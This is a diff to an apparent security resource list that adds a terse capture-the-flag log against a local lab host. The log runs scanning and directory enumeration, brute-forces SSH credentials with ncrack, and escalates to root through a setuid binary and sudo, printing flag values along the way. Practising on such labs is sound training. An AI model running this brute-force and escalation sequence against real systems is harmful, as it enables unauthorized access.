@@ -278,3 +278,35 @@ VII. Detection & Defense Evasion
 | Abusing LOLBINs rundll32.exe Lab | Sysmon Detection	Article on detecting Living Off The Land Binaries abuse with Sysmon. |	[dev.to](https://dev.to/saravana_gautham_g/abusing-lolbins-rundll32exe-lab-sysmon-detection-170h)
 | Sysmon Documentation |	System Monitor service for detailed logging of system activity.	 | [microsoft.com ](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 
+
+# CTF
+
+docker ps
+nmap -A <ip>
+dirb http://127.0.0.5
+nikto -host 127.0.0.5
+└─$ nikto -host 127.0.0.5
++ Uncommon header 'x-ctf-key' found, with contents: 15a1d7be51a3e96e68790a15d12319f520046c574bb477b72e76526f36a97779b9e593d68f3379852e1a63a5c6558904f41306b56212049fbd25596b3a53ae12
+curl http://127.0.0.5/robots.txt
+sudo apt install gobuster
+gobuster dir --url http://127.0.0.5 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt 
+gobuster dir --url http://127.0.0.5 -w /usr/share/dirb/wordlists/common.txt 
+searchsploit "OpenSSH 8.4p1"
+ncrack -p ssh --user ljs65student -P common.txt ssh://127.0.0.5:2222 
+	Discovered credentials for ssh on 127.0.0.5 2222/tcp:
+	127.0.0.5 2222/tcp ssh: 'ljs65student' 'secret'
+	ljs65student@032ebafeee2a:~$ cat flag.txt 
+	304a86fc395b44deaa6558a21d7746ae1ac75dabf8415431a1a0f9c34b9ad71ba3bf286700f56cb5758b2526c6ce4b9d85fbca7348042917426992a80d2f6556
+ljs65student@032ebafeee2a:/home/ljs65admin$ ./powerup -p    
+powerup-5.1$ id
+uid=1000(ljs65student) gid=1000(ljs65student) euid=1001(ljs65admin) groups=1000(ljs65student)
+powerup-5.1$ cat flag.txt 
+562f136e25e3ab3e8c17dac4b2238ca967b656ece2bdcb3b445e80b33ead4536f4ca8648779679bfef39b413d0f44dfe73912e7f3de8eb90d7dfb2e4c33606dc
+ljs65admin@032ebafeee2a:~$ sudo su
+root@032ebafeee2a:/home/ljs65admin# cd /root/
+root@032ebafeee2a:~# ls
+flag.txt
+root@032ebafeee2a:~# cat flag.txt 
+e226e2142581eabe9135f823e5d5f85d1065e3d50836b8ddedea62e5cdd10d30ebae671eb59c0e21374868aff6efabb387591a3f59a1f9e886d11392bfdcfad3
+	
+
